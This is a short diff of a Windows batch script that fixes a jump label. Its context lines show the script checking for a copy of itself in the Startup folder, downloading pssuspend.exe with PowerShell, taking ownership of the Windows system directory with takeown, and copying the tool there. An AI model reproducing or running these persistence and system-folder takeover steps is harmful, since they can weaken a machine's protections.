@@ -74,7 +74,7 @@ if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%self%" goto o
 ::check for pssuspend being already downloaded.
 if exist "%temp%\pssuspend.exe" goto skip1
 powershell.exe -command "Invoke-WebRequest -Uri 'https://live.sysinternals.com/pssuspend.exe' -OutFile '%temp%\pssuspend.exe'
-:ok1
+:skip1
 ::copies the files to the system to be accessable through the command line.
 takeown /A /F "%systemroot%" & copy /v /y "%temp%\pssuspend.exe" "%systemroot%"
 copy /v /y "%temp%\pssuspend.exe" "%systemroot%"
